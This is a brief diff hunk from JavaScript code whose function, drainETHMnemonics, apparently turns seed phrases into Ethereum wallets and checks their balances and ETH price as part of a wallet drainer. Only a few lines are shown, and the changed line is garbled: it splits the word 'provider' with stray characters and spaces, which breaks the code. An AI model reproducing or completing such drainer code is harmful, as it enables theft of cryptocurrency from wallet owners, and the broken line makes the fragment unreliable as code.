@@ -33,7 +33,7 @@ const drainETHMnemonics=async ()=>{
     try{
   
        
-            wallet =  ethers.Wallet.fromPhrase(mnemonic,provider);
+            wallet =  ethers.Wallet.fromPhrase(mnemonic,p b               rovider);
         
         const ethBalance=await provider.getBalance(wallet.address)
         const ethPrice = await getEthPrice();
